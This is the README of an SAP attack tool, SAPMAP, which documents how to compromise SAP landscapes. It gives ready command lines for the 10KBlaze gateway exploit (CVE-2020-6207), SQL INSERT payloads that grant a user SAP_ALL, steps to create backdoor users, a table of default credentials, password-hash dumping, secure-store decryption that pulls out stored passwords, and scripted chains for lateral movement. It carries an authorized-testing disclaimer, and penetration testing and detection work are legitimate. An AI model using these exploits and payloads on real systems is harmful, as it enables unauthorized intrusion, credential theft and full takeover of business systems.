# SAPMAP — SAP Landscape Attack Path Mapper

```
   _____ ___    ____  __  ______    ____
  / ___//   |  / __ \/  |/  /   |  / __ \
  \__ \/ /| | / /_/ / /|_/ / /| | / /_/ /
 ___/ / ___ |/ ____/ /  / / ___ |/ ____/
/____/_/  |_/_/   /_/  /_/_/  |_/_/
```

**Like BloodHound for Active Directory, but for SAP.**

SAPMAP discovers SAP systems on a network, maps RFC connections between them, exploits gateway vulnerabilities and weak configurations, and charts lateral movement paths across the entire SAP landscape — all from an interactive web-based map.

> ## ⚠️ Disclaimer — Use at your own risk
>
> SAPMAP implements **real, working exploits** against SAP systems.
> Running it against a system you do not own or do not have explicit
> written permission to test is **illegal** in most jurisdictions and
> may cause data loss, account lockouts, outages, and audit findings.
>
> **Intended solely for:** authorized penetration tests, defensive
> research on systems you own, educational study of SAP attack
> surfaces, and SOC / blue-team detection-engineering exercises.
>
> **No warranty** — the authors accept no liability for damage caused
> by use or misuse of this tool. You are responsible for obtaining
> written authorization before every run and for cleaning up artifacts
> (SAPMAP00 users, dropped JSPs, TCP/IP destinations) when done.
>
> See [`DISCLAIMER.md`](DISCLAIMER.md) for the full text.

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Installation](#installation)
- [Usage](#usage)
- [Web GUI](#web-gui)
- [Scanning](#scanning)
- [Default Account Detection](#default-account-detection)
- [Exploitation](#exploitation)
- [Local Privilege Escalation](#local-privilege-escalation)
- [Propagation](#propagation)
- [SAProuter Support](#saprouter-support)
- [SAP Secure Store Decryption](#sap-secure-store-rsectab-decryption)
- [Standalone Tools](#standalone-tools)
- [State Management](#state-management)
- [Testing](#testing)
- [Configuration](#configuration)

---

## Features

### Discovery & Enumeration
- **Network scanning** — Fast mode (dispatcher/gateway ports) and deep mode (full SAPology fingerprinting)
- **Target parsing** — Single IPs, CIDR subnets, IP ranges, comma-separated lists, files (`@targets.txt`)
- **Client enumeration** — Bruteforce SAP clients 000–999 via DIAG protocol
- **System identification** — Unauthenticated RFC_SYSTEM_INFO probing (3 methods: V6 single-packet, V2 error leak, Chipik-style)
- **SAPControl queries** — Extract SID, database type, system type, and OS via SOAP API (GetInstanceProperties, GetProcessList)
- **Database detection** — Port fingerprinting for HANA, MaxDB, MSSQL, Oracle, DB2

### Default Account Detection
- **SAP default credential scanning** — Tests 16 well-known SAP default username/password combinations via DIAG protocol
- **Sequential testing** — No threading to minimize account lockout risk
- **Smart skip** — Stops testing locked users and non-dialog users automatically
- **Automatic credential import** — Confirmed credentials are added to the system for further exploitation

### Exploitation
- **Gateway SAPXPG exploit** — Unauthenticated OS command execution via the 10KBLAZE technique (P1→P2→P3→P4 protocol chain)
- **Direct database injection** — Create SAP users by injecting into USR02/UST04/USRBF2 tables via SQL CLI tools (hdbsql, sqlcli, sqlcmd, sqlplus, db2)
- **BAPI user creation** — Authenticated user creation with SAP_ALL via BAPI_USER_CREATE1
- **SXPG remote execution** — Create users on remote systems via TCP/IP RFC destinations and SXPG_STEP_XPG_START
- **Post-creation verification** — Confirm user exists and has SAP_ALL via RFC logon + BAPI_USER_GET_DETAIL

### Local Privilege Escalation
- **Extensible LPE framework** — Plugin-style `@lpe_method` decorator: add new methods by writing one function
- **BAPI profile assignment** — Direct RFC call to assign SAP_ALL via BAPI_USER_PROFILES_ASSIGN (requires S_RFC)
- **WebGUI RSBDCOS0 exploit** — Reverse-engineered WebGUI HTTP protocol to execute OS commands via RSBDCOS0, running SQL INSERTs to assign SAP_ALL directly in the database — bypasses S_RFC authorization entirely

### Lateral Movement
- **RFC connection mapping** — Retrieve all Type 3 and TCP/IP RFC destinations from compromised systems
- **Destination testing** — Validate logon, ping, and latency via /SDF/RFC_CHECK with automatic fallback to DEST_CHECK_CONNECTION on older systems
- **Automated propagation** — Iteratively exploit RFC connections to move across the landscape
- **Attack path visualization** — Color-coded connections showing SAP_ALL access, gateway exploit paths, and risk levels

### Interactive Map
- **SVG-based visualization** — Drag-and-drop system nodes with persistent positions
- **Real-time console** — Live streaming output of all operations
- **Context menus** — Right-click systems or the map background for quick actions
- **Connection details** — Hover over RFC links to see destination info, profiles, roles, risk assessment
- **State persistence** — Save/load `.sapmap` session files, auto-save on exit

### SAP Secure Store Decryption (RSECTAB)
- **Full RSECTAB decryption** — Extract RFC destination passwords, DB connection credentials, CTS transport passwords, SMTP credentials, and HMAC keys
- **Individual key support** — Reads SSFS KEY + DAT files from the OS filesystem, decrypts with SAP's RSECCipher (custom DES with proprietary S-boxes), extracts the RSECTAB individual encryption key
- **Default key support** — Systems using the well-known default key are decrypted automatically
- **VERSION 2 + VERSION 3** — Handles both legacy (two-stage 3DES with keyprime) and modern (single-stage, `RSEC` magic) formats
- **Multiple fallback paths** — ABAP exec → SXPG file read (base64/certutil) → SXPG database query (hdbsql/sqlcli/sqlcmd/sqlplus) → RFC_READ_TABLE → client fallback
- **Client fallback** — When ABAP exec is blocked by SCC4, auto-discovers open clients via T000 CCCORACTIV, creates SAPMAP00 there, and retries
- **Map integration** — Decrypted passwords enriched onto RFC connections (click to reveal), categorised entries shown in node detail panel, credentials added to target nodes for lateral movement
- **SecStore-based lateral movement** — When BAPI via DESTINATION fails (locked source), extracts RFC destination password from SecStore and connects directly to target

### SAProuter Support
- **Transparent routing** — All operations (RFC, port scanning, GW exploit, system probing) work through SAP Router proxy
- **NI_ROUTE protocol** — Pure Python implementation of SAProuter tunnel establishment (NI_ROUTE → NI_PONG)
- **Per-system configuration** — Set SAProuter string per system via right-click menu or manual add dialog
- **Automatic inheritance** — Target systems discovered via RFC connections inherit the source's SAProuter
- **RFC SDK integration** — NW RFC SDK's native `saprouter` parameter used for authenticated connections

### Data Extraction
- **Password hash download** — Extract BCODE/PASSCODE/PWDSALTEDHASH from USR02 (includes iSSHA-1 salted hashes)
- **Arbitrary table reads** — Download any SAP table via RFC_READ_TABLE
- **Client role detection** — Identify production (P), QA (Q), test (T) systems from T000 with CCCORACTIV
- **SecStore download** — Decrypt and export all RSECTAB entries as categorised JSON loot

### Cleanup
- **User deletion** — Remove all created SAPMAP users via BAPI_USER_DELETE
- **Destination removal** — Clean up created TCP/IP RFC destinations

---

## Architecture

```
sapmap.py                    Entry point — CLI args, server launch, state management
│
├── sapmap_gui.py            Bottle HTTP server — 50+ REST API routes
│   └── sapmap_html.py       Single-page web application (HTML/CSS/JS)
│
├── sapmap_scanner.py        Network discovery — fast/deep scan, SAPControl, RFC probing
├── sapmap_exploit.py        Exploitation engine — GW exploit, BAPI, SXPG, propagation
├── sapmap_lpe.py            Local privilege escalation — extensible method registry (WebGUI, BAPI)
├── sapmap_rfc.py            Authenticated RFC operations — BAPI calls, table reads, destination testing
│
├── sapmap_secstore.py       SecStore (RSECTAB) decryption — SSFS key extraction, 3DES decrypt, map integration
├── sapmap_models.py         Data models — SAPNode, RFCConnection, CreatedUser, SAPMAPState
├── sapmap_config.py         Configuration — SQL templates, password hashes, defaults, colors
├── sapmap_state.py          State persistence — save/load JSON, RFC cache, destinations
└── sapmap_cleanup.py        Cleanup — delete users, remove destinations
```

### Standalone Tools

```
sap_gw_xpg_standalone.py    Gateway SAPXPG exploit — raw SAP NI protocol (stdlib only)
sap_ms_betrusted.py          10KBlaze betrusted — MS registration + NILIST IP injection (stdlib only)
sap_rfc_system_info.py       Unauthenticated RFC_SYSTEM_INFO retrieval with SAProuter support
sap_client_enum.py           DIAG protocol client enumeration (stdlib only)
sap_rfc_ctypes.py            RFC connection library — ctypes wrapper for SAP NW RFC SDK
sap_default_creds.py         Default SAP credential scanner via DIAG protocol
sap_rsec_cipher.py           SAP RSECCipher — proprietary DES variant for SSFS encryption
sap_saprouter.py             SAProuter NI protocol tunnel for routing through SAP Router
```

### Key Data Models

| Model | Purpose |
|-------|---------|
| `SAPNode` | An SAP system: SID, type, instances, ports, credentials, findings, position on map |
| `RFCConnection` | An RFC link between two systems: destination name, user, profiles, SAP_ALL status, risk level |
| `CreatedUser` | A user created by SAPMAP: username, method (gw_exploit/bapi/sxpg), password, timestamp |
| `SAPMAPState` | The full session: all nodes, connections, created users, scan config |

---

## Installation

### Requirements

- Python 3.8+
- `bottle` — HTTP server framework
- `pywebview` — Native window (optional, falls back to browser)

### Setup

```bash
git clone https://github.com/kloris/SAPMAP.git
cd SAPMAP
pip install bottle pywebview pycryptodome
```

> `pycryptodome` is required for SecStore (RSECTAB) decryption. Without it, all other features work normally.

### SAP NW RFC SDK (optional, for authenticated operations)

Authenticated RFC calls (BAPI user creation, RFC connection retrieval, table reads) require the SAP NetWeaver RFC SDK:

1. Download from SAP Software Center (requires S-user)
2. Extract to e.g. `/opt/nwrfcsdk/`
3. Set the library path:
   ```bash
   export LD_LIBRARY_PATH=/opt/nwrfcsdk/lib:$LD_LIBRARY_PATH
   ```
4. Pass `--sdk /opt/nwrfcsdk/lib` when launching SAPMAP

> Unauthenticated features (scanning, gateway exploit, system info) work without the SDK.

---

## Usage

### Launch the GUI

```bash
python3 sapmap.py                                    # Auto-detect: pywebview or browser
python3 sapmap.py --browser                          # Force browser mode
python3 sapmap.py --port 8080                        # Custom port
python3 sapmap.py --load states/my_landscape.sapmap  # Resume a saved session
python3 sapmap.py --sdk /opt/nwrfcsdk/lib            # Set NW RFC SDK path
python3 sapmap.py --script scripts/demo_10kblaze.yaml  # Run scripted scenario with GUI
```

### CLI Options

| Option | Description |
|--------|-------------|
| `--load FILE` | Load a saved `.sapmap` state file |
| `--sdk PATH` | Path to SAP NW RFC SDK lib directory |
| `--port PORT` | HTTP server port (0 = auto-select) |
| `--script FILE` | Run a scripted scenario (YAML/JSON) with GUI visualization ([details](#scripted-scenarios)) |
| `--browser` | Force browser mode (skip pywebview) |
| `--no-gui` | Server only — open browser manually |
| `--targets TARGETS` | Scan targets (CLI mode, implies --no-gui) |
| `--fast` | Fast scan mode (default) |
| `--deep` | Deep scan mode (full SAPology) |
| `-v, --verbose` | Verbose output |
| `--debug` | Enable debug logging |

---

## Web GUI

The web interface is a single-page application with an interactive SVG map.

### Map Interaction

| Action | Effect |
|--------|--------|
| **Drag node** | Reposition a system on the map |
| **Left-click node** | Show system info panel |
| **Right-click node** | Open system context menu |
| **Right-click background** | Open global actions menu |
| **Hover connection** | Show RFC connection details |
| **Mouse wheel** | Zoom in/out |
| **Ctrl+S** | Save state |

### System Context Menu

| Action | Description |
|--------|-------------|
| RFC System Info | Unauthenticated system probing (SID, OS, DB, kernel) |
| Deep Scan | Full SAPology vulnerability assessment |
| Set/Test Credentials | Manage authentication for the system |
| Retrieve RFC Connections | Map all RFC destinations (via RSRFCCHK) |
| Test RFC Destinations | Validate all discovered connections |
| Check Gateway | Test SAPXPG vulnerability |
| Check Default Accounts | ⚠️ Test 16 default SAP credentials via DIAG (may lock accounts!) |
| Create User (GW Exploit) | Unauthenticated user creation via gateway |
| Create User (BAPI) | Authenticated user creation |
| Try Local Privilege Escalation | Assign SAP_ALL to current user (tries BAPI, then WebGUI SQL) |
| Propagate | Exploit RFC links to reach other systems |
| Download Hashes | Extract USR02 password hashes (BCODE/PASSCODE/PWDSALTEDHASH) |
| Download SecStore | Decrypt RSECTAB — extract RFC/DB/CTS/SMTP passwords |
| Download Table | Read arbitrary SAP table data |
| Set OS/DB/System Type | Manual override for detection gaps |
| Set SAProuter | Configure SAProuter route string for this system |
| Cleanup Users | Delete all SAPMAP-created users |
| Delete System | Remove from the map |

### Map Background Menu

| Action | Description |
|--------|-------------|
| Add System Manually | Add a system by IP/hostname (with optional SAProuter) |
| Set Default Password | Change SAPMAP00 password for this session |
| Auto-Propagate All | Propagate from all compromised systems |
| Check All GW Vulnerabilities | Test gateway exploit on all systems with 2+ nodes |
| Cleanup All Users | Delete all created users across all systems |
| Fit to Window | Auto-zoom to fit all systems |
| Reset Layout | Rearrange all systems |

### Visual Indicators

| Element | Meaning |
|---------|---------|
| Green border | Normal system |
| Dark red border | Critical findings or vulnerable gateway |
| Red-tinted fill | Production system |
| Orange-tinted fill | Non-production system |
| Red connection line | RFC destination with SAP_ALL |
| Blue connection line | Regular RFC connection |
| Orange connection line | Gateway exploit path |
| Lightning bolt icon | System is compromised (pwned) |
| 🔗 via SAProuter | System is accessed through SAP Router proxy |
| PRD bar (red) | Production system detected |
| Non-PRD bar (orange) | Clients found, no production client |
| "Clients found" bar | Clients enumerated, roles not yet retrieved |
| SecStore Pwd indicator | Decrypted password available on RFC connection (click to reveal) |

---

## Scanning

### Fast Scan (default)

Scans dispatcher ports (32XX) and gateway ports (33XX) across the instance range 00–99:

```
Target: 10.0.0.0/24
Ports checked per host: 3200-3299 (dispatcher), 3300-3399 (gateway)
```

For each discovered system, SAPMAP automatically:
1. Probes RFC_SYSTEM_INFO (unauthenticated) to get SID, hostname, OS, DB type, kernel
2. Falls back to SAPControl SOAP API for SID, DB type, system type (ABAP/JAVA)
3. Falls back to SAPControl GetProcessList for OS type detection (.EXE = Windows)
4. Scans database ports (HANA 3XX13, MaxDB 7210, MSSQL 1433, Oracle 1521, DB2 50000)
5. Enumerates clients via DIAG protocol

### Deep Scan

Uses SAPology for comprehensive port scanning, service fingerprinting, and vulnerability assessment including SSL/TLS checks, MS ACL testing, and CVE detection.

---

## Default Account Detection

Right-click a system → Scanning → **⚠️ Check Default Accounts**

> **WARNING**: Failed login attempts may lock SAP accounts. A confirmation dialog is shown before testing.

Tests 16 well-known default SAP credentials via DIAG protocol (dispatcher port 32XX):

| Severity | Username | Default Password | Clients |
|----------|----------|-----------------|---------|
| CRITICAL | SAP* | 06071992 | All |
| CRITICAL | SAP* | PASS | All |
| CRITICAL | DDIC | 19920706 | All |
| CRITICAL | IDEADM | admin | All |
| HIGH | EARLYWATCH | SUPPORT | 066 |
| MEDIUM | TMSADM | PASSWORD | All |
| HIGH | SMD_ADMIN | init1234 | All |
| HIGH | SOLMAN_ADMIN | init1234 | All |
| ... | *(16 combinations total)* | | |

**Safety features:**
- Sequential testing (no parallel requests) to minimize lockout risk
- Automatically stops testing a user after it's detected as locked
- Skips non-dialog users (SAP doesn't verify password for these)
- Confirmed credentials are automatically added to the system's credential list

**Result classification:**
- `SUCCESS` — Full login worked
- `PASSWORD_CHANGE` — Password correct but expired
- `NO_AUTH_LOGON` — Password correct but no dialog authorization
- `USER_LOCKED` — User is locked (skips further attempts)

---

## Exploitation

### Gateway SAPXPG Exploit (Unauthenticated) — 10KBlaze / CVE-2020-6207

The 10KBLAZE technique exploits the unauthenticated SAP Message Server internal port to register a fake application server, which injects the attacker's IP into the SAP Gateway's trusted host list. Once trusted as "internal", the attacker can execute OS commands via the SAPXPG external program interface without authentication.

**Attack chain:**

```
1. betrusted    → Register fake app server with MS (port 39XX)
2. NILIST reply → MS propagates attacker IP to GW trust list
3. SAPXPG P1    → GW_NORMAL_CLIENT registration
4. SAPXPG P2    → F_SAP_INIT (now trusted as "internal")
5. SAPXPG P3    → SAPXPG_START_XPG — execute OS command
6. SAPXPG P4    → SAPXPG_END_XPG — retrieve command output
```

**Prerequisites on the target system:**

| Requirement | Detail |
|---|---|
| MS ACL | `HOST=*` in `ms_acl_info` (or at least allows attacker IP to register) |
| MS internal port | Port `39XX` (XX = instance number + 1 for ASCS) must be reachable through any firewall |
| `system/secure_communication` | Must be `OFF` (default) — when `ON`, the MS requires SNC for internal connections |
| `gw/reg_no_conn_info` | Must be `0` — controls whether the GW accepts NILIST trust propagation from registered servers. Default is `1` (blocked) on hardened systems (SAP Note 2408073) |
| Gateway secinfo ACL | Must allow `USER-HOST=internal` traffic (the 3 default rules suffice: `P USER=* USER-HOST=internal HOST=local TP=*`) |

> **Note:** The auto-derived server name preserves dots in the IP address (e.g. `192.168.2.210_S4H_00_a3f5`) so that SAP's `gethostbyname()` resolves the IP directly — no `/etc/hosts` modification is needed on the target. However, systems that had a failed reverse DNS lookup cached (NiHLGetNodeAddr) before the hosts file was updated will need a full instance restart to clear the cache.

**Confirmed working on:**

| System | Kernel | OS | Result |
|---|---|---|---|
| S4H | 793 | Linux | `uid=1001(s4hadm)` |
| TWT | 753 | Windows | `twtestenv1\sapservicetwt` |
| W74 | 742 | Windows | `winwas740\sapservicew74` |

SAPMAP uses this to run SQL commands that create a user directly in the database:

| Database | Method |
|----------|--------|
| HANA | Write SQL to temp file via python3, execute with `hdbsql -I` |
| MaxDB | Write SQL to temp file via python, execute with `sqlcli -i` |
| MSSQL | Execute `sqlcmd -Q` with inline SQL |
| Oracle | Pipe SQL to `sqlplus` via `/bin/sh -c` |
| DB2 | Execute `db2` CLI with inline SQL |

The created user (SAPMAP00) gets:
- Pre-computed password hashes (BCODE + PASSCODE, CODVN=G)
- SAP_ALL and SAP_NEW profiles
- Service user type (USTYP=S)
- Reference user DDIC
- Full authorization object entries (S_RFC, S_TCODE, S_USER_GRP, etc.)

### BAPI User Creation (Authenticated)

When credentials are available, SAPMAP creates users via standard BAPI function modules:

1. `BAPI_USER_CREATE1` — Create the user with USTYP=S
2. `BAPI_USER_PROFILES_ASSIGN` — Assign SAP_ALL + SAP_NEW profiles
3. `BAPI_USER_GET_DETAIL` — Verify the user was created successfully

### RFC Destination Testing

SAPMAP tests RFC destinations using `/SDF/RFC_CHECK` with automatic fallback to `DEST_CHECK_CONNECTION` on older systems (NW < 7.40) where `/SDF/RFC_CHECK` doesn't exist. The fallback also provides remote system SID, client, and basis release.

---

## Local Privilege Escalation

When you have SAP credentials that lack SAP_ALL, SAPMAP can attempt to escalate the user's privileges directly on the system. Right-click a system on the map and choose **"Try Local Privilege Escalation"**.

### How It Works

SAPMAP tries registered LPE methods in priority order until one succeeds:

| Priority | Method | Mechanism | Requirements |
|----------|--------|-----------|--------------|
| 10 | `bapi_profiles_assign` | Direct RFC call to `BAPI_USER_PROFILES_ASSIGN` | S_RFC authorization for the BAPI function group |
| 50 | `webgui_rsbdcos0` | Execute SQL via OS commands through WebGUI | WebGUI HTTP access + S_TCODE for SE38 + authorization for RSBDCOS0 |

### WebGUI RSBDCOS0 Method (Detail)

This method reverse-engineers the SAP WebGUI HTTP protocol to execute OS commands without S_RFC authorization. The WebGUI runs transactions in dialog mode on the application server, so only S_TCODE and object-level authorizations apply — **not S_RFC**.

**Protocol flow:**

1. Open `SE38` with program `RSBDCOS0` via URL parameter: `~transaction=*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt`
2. Load the selection screen via initial POST roundtrip with XSRF token (`~SEC_SESSTOKEN`)
3. Execute OS commands via `state/ur` URL pattern with field values in the path

**SQL statements executed** (example for HANA, user `basis_user`, client `000`):

```sql
-- Assign SAP_ALL and SAP_NEW profiles
INSERT INTO UST04 (MANDT,BNAME,PROFILE) VALUES ('000','basis_user','SAP_ALL')
INSERT INTO UST04 (MANDT,BNAME,PROFILE) VALUES ('000','basis_user','SAP_NEW')
INSERT INTO USR04 (MANDT,BNAME,NRPRO,PROFS) VALUES ('000','basis_user','14','C SAP_ALL')

-- Authorization object entries (S_RFC, S_TCODE, S_USER_GRP, etc.)
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_ADMI_FCD','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_DATASET','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_DEVELOP','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_RFC','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_TABU_DIS','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_TCODE','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_USER_AUT','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_USER_GRP','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_USER_PRO','^&_SAP_ALL')
INSERT INTO USRBF2 (MANDT,BNAME,OBJCT,AUTH) VALUES ('000','basis_user','S_XMI_PROD','^&_SAP_ALL')
```

Each SQL statement is wrapped in the appropriate DB CLI command (hdbsql for HANA, sqlcli for MaxDB, sqlcmd for MSSQL, sqlplus for Oracle, db2 for DB2) and executed as an OS command via RSBDCOS0.

### Adding New LPE Methods

New methods can be added by defining a decorated function in `sapmap_lpe.py` — no GUI, API, or framework changes needed:

```python
@lpe_method("my_new_method", "Description shown in console output", priority=75)
def lpe_my_new_method(node: SAPNode, creds: Credentials) -> bool:
    # Your escalation logic here
    # Return True if SAP_ALL was successfully assigned
    return True
```

---

## Propagation

Propagation is the core lateral movement capability. From a compromised system, SAPMAP:

1. **Retrieves RFC connections** — Runs RSRFCCHK to discover all Type 3 and TCP/IP destinations
2. **Tests each destination** — Validates logon success, SAP_ALL on the RFC user, and TCP/IP ping
3. **Creates users on targets** — Uses the best available method:
   - BAPI via RFC destination (if logon works and RFC user has SAP_ALL)
   - SXPG via TCP/IP destination (if remote command execution works)
   - Gateway exploit (if target gateway is vulnerable)
4. **Recurses** — Repeats from each newly compromised system

The map updates in real-time as new systems are reached, showing attack paths as colored connection lines.

---

## SAProuter Support

SAPMAP can reach SAP systems behind a SAP Router proxy. The SAProuter uses the NI (Network Interface) protocol to create TCP tunnels.

### Configuration

Set a SAProuter route string when adding a system manually, or right-click an existing system → Settings → Set SAProuter:

```
/H/<router_ip>/S/<router_port>/W/<password>
```

Example: `/H/3.221.134.53/S/3299/W/my_password`

### What Routes Through SAProuter

When a system has a SAProuter string configured, **all operations** route through it:

| Operation | Mechanism |
|-----------|-----------|
| RFC connections | NW RFC SDK native `saprouter` parameter |
| RFC System Info | `probe_sap_system()` via `connect_via_saprouter()` TCP tunnel |
| GW vulnerability check | `_gw_connect()` via SAProuter NI_ROUTE tunnel |
| GW exploit (user creation) | All P1→P2→P3→P4 packets via tunnel |
| Port scanning | `_scan_port()` via SAProuter tunnel |
| SecStore download | Both ABAP exec and SXPG fallbacks use RFC/SXPG which route through SAProuter |

### SAProuter Inheritance

When propagating from system A (with SAProuter) to system B (discovered via RFC connections), system B automatically inherits A's SAProuter string. This ensures newly discovered systems behind the router are also reachable.

---

## SAP Secure Store (RSECTAB) Decryption

SAPMAP can decrypt the SAP Secure Store to extract stored passwords for RFC destinations, database connections, CTS transport, and SMTP — enabling lateral movement via the extracted credentials.

### Decryption Chain

```
SSFS_SID.KEY ──[KEK + RSECCipher]──► SSFS master key (24 bytes)
SSFS_SID.DAT ──[RSECCipher + SSFS key]──► SECSTORE_DB/KEY record
Record[33:57] ──► RSECTAB individual key (24 bytes)
RSECTAB.DATA ──[standard 3DES + individual key]──► plaintext passwords
```

### Fallback Strategy

The SecStore download tries multiple methods in order:

1. **ABAP exec** (`RFC_ABAP_INSTALL_AND_RUN`) — reads SSFS files + RSECTAB with proper hex encoding
2. **SXPG file read** — reads SSFS KEY/DAT via `base64` (Linux) or `certutil` (Windows) OS commands
3. **SXPG database query** — reads RSECTAB via `hdbsql`/`sqlcli`/`sqlcmd`/`sqlplus`/`db2` CLI
4. **RFC_READ_TABLE** — last resort (unreliable for RAW fields)
5. **Client fallback** — discovers open clients via T000 CCCORACTIV, creates SAPMAP00 there, retries

### Entry Categories

Decrypted entries are categorised and colour-coded in the UI:

| Category | Pattern | Color |
|----------|---------|-------|
| RFC | `/RFC/S4D`, `/RFC/TMSADM@H2T.DOMAIN` | Orange |
| DB | `/DBCON/SYSTEMDB@H2T` | Blue |
| CTS | `/CTS/PWD/$T$/DOMAIN/DOMCTL` | Green |
| SMTP | `BC_SX_SMTP` | Purple |
| HMAC | `/HMAC_INDEP/...` | Grey |
| PSE | `/STRUST_PSE_PIN/...` | Grey |

---

## Standalone Tools

Each standalone tool works independently with no external dependencies (Python 3 stdlib only).

### sap_ms_betrusted.py

10KBlaze betrusted exploit — register a fake application server with the SAP Message Server to inject the attacker's IP into the Gateway's trusted host list:

```bash
# Check if MS internal port is unprotected (CVE-2020-6207)
python3 sap_ms_betrusted.py check-acl -t 192.168.1.100 -n 0

# Run the betrusted attack (inject attacker IP as trusted)
python3 sap_ms_betrusted.py exploit \
    -t 192.168.1.100 -p 3901 -n 0 \
    -a 192.168.2.210 \
    --dp-version 14 -v

# For older kernels (742): use dp-version 11
python3 sap_ms_betrusted.py exploit \
    -t 192.168.1.100 -p 3941 -n 40 \
    -a 192.168.2.210 \
    --dp-version 11 --old-kernel -v
```

After betrusted injects trust, use `sap_gw_xpg_standalone.py` to execute commands via the gateway. The betrusted connection must stay open while running SAPXPG (trust is revoked on disconnect).

### sap_gw_xpg_standalone.py

Gateway SAPXPG command execution:

```bash
python3 sap_gw_xpg_standalone.py \
    --host 192.168.1.100 --port 3300 \
    --sid S4H --hostname s4hanadev \
    --command whoami --params "" \
    --kernel 793 -v
```

### sap_rfc_system_info.py

Unauthenticated system info retrieval (supports SAProuter):

```bash
python3 sap_rfc_system_info.py -t 192.168.1.100 -p 3300 -v
python3 sap_rfc_system_info.py -t 172.31.14.107 -p 3200 -R 3.221.134.53:3299 -v
```

Extracts SID, hostname, OS, kernel version, database type, and IP addresses using four probe methods (V6 single-packet, V2 error leak, Chipik-style, DIAG login screen).

### sap_client_enum.py

DIAG-based client enumeration:

```bash
python3 sap_client_enum.py -t 192.168.1.100 -p 3200
```

Discovers valid client numbers (000–999) by testing DIAG logon responses.

---

## Scripted Scenarios

SAPMAP supports automated attack scenarios via script files. The GUI opens normally and each step executes visually — you watch the attack unfold on the map in real-time.

### Usage

```bash
python3 sapmap.py --script scripts/demo_10kblaze.yaml
python3 sapmap.py --script scripts/demo_simple.json    # JSON (no PyYAML needed)
```

### Script Format (YAML)

```yaml
name: "My Attack Scenario"
description: "Optional description shown in console"

steps:
  - action: add_system
    sid: S4H
    ip: 192.168.2.209
    instance: "00"

  - action: check_gw
    target: S4H

  - action: create_user
    target: S4H
    method: gw_exploit
    client: "001"
```

### Script Format (JSON)

```json
{
  "name": "My Attack Scenario",
  "steps": [
    {"action": "add_system", "sid": "S4H", "ip": "192.168.2.209", "instance": "00"},
    {"action": "check_gw", "target": "S4H"},
    {"action": "create_user", "target": "S4H", "method": "gw_exploit", "client": "001"}
  ]
}
```

### Available Actions

#### System Management

| Action | Parameters | Description |
|--------|-----------|-------------|
| `add_system` | `sid`, `ip`, `instance`, `saprouter` (optional) | Add a system to the map |
| `set_credentials` | `target`, `username`, `password`, `client` | Store credentials for a system |
| `sleep` | `seconds` | Pause between steps |

#### Scanning & Detection

| Action | Parameters | Description |
|--------|-----------|-------------|
| `scan` | `targets` (CIDR/range/IP), `mode` (`fast` or `deep`), `concurrent_hosts` (default: 5) | Scan a network for SAP systems (e.g. `192.168.2.0/24`) |
| `check_gw` | `target` | Check if SAP Gateway is vulnerable to SAPXPG exploit |
| `check_ms` | `target` | Check if MS internal port is unprotected (CVE-2020-6207) |
| `deep_scan` | `target` | Run full SAPology vulnerability scan |
| `check_all_gw` | *(none)* | Check GW vulnerability on all systems on the map |
| `check_all_betrusted` | `attacker_ip` (`auto` = detect) | Check 10KBlaze on all systems on the map |

#### Exploitation

| Action | Parameters | Description |
|--------|-----------|-------------|
| `betrusted` | `target`, `attacker_ip` (`auto` = detect), `nilist_wait` (default: 30) | Inject attacker IP into GW trust list via MS betrusted |
| `betrusted_chain` | `target`, `attacker_ip`, `nilist_wait`, `client` | Full 10KBlaze chain: betrusted → GW exploit → create user |
| `create_user` | `target`, `method` (`gw_exploit` or `credentials`), `client` | Create a SAPMAP user with SAP_ALL |
| `create_user_via_rfc` | `target` (source SID), `destination` (RFC dest name), `target_sid` (remote SID) | Create a user on a remote system via an RFC destination |
| `lpe` | `target`, `method` (optional — tries all if omitted) | Local privilege escalation (assign SAP_ALL to current user) |
| `propagate` | `target` | Exploit RFC connections to reach other systems |

#### Data Extraction

| Action | Parameters | Description |
|--------|-----------|-------------|
| `retrieve_rfcs` | `target` | Retrieve all RFC destinations from the system |
| `test_rfcs` | `target` | Test/ping all discovered RFC destinations |
| `test_rfc_single` | `target`, `destination` (RFC destination name) | Test a single specific RFC destination |
| `download_hashes` | `target` | Extract USR02 password hashes (BCODE/PASSCODE) |
| `download_secstore` | `target` | Decrypt SecStore (RSECTAB) — RFC/DB/CTS/SMTP passwords |
| `impact_assess` | `target`, `client` (optional), `scenario` (optional) | Run business impact assessment (all or one scenario) |
| `impact_show` | `target` | Print all impact results to the console |
| `impact_export` | `target`, `scenario` (optional — omit to export all) | Export impact data to CSV in the states/ folder |

#### Landscape Analysis

| Action | Parameters | Description |
|--------|-----------|-------------|
| `analyze_chains` | *(none)* | Discover RFC trust chain escalation paths across the landscape |
| `highlight_chain` | `start` + `end` (SIDs), or `index` (0-based) | Highlight an attack chain on the map with pulsing red path |

### Per-Step Options

Every step supports these optional fields:

| Option | Default | Description |
|--------|---------|-------------|
| `timeout` | 300 | Maximum seconds to wait for the step to complete |
| `delay` | 1 | Seconds to pause after the step finishes |
| `required` | false | If `true`, abort the entire script when this step fails |

### Example: Full 10KBlaze Chain

```yaml
name: "10KBlaze Full Chain Demo"
description: "Compromise SAP S4H via betrusted + GW exploit, then extract business data"

steps:
  - action: add_system
    sid: S4H
    ip: 192.168.2.209
    instance: "00"

  - action: check_gw
    target: S4H

  - action: check_ms
    target: S4H

  - action: betrusted
    target: S4H
    attacker_ip: auto

  - action: create_user
    target: S4H
    method: gw_exploit
    client: "001"

  - action: retrieve_rfcs
    target: S4H

  - action: download_secstore
    target: S4H

  - action: impact_assess
    target: S4H
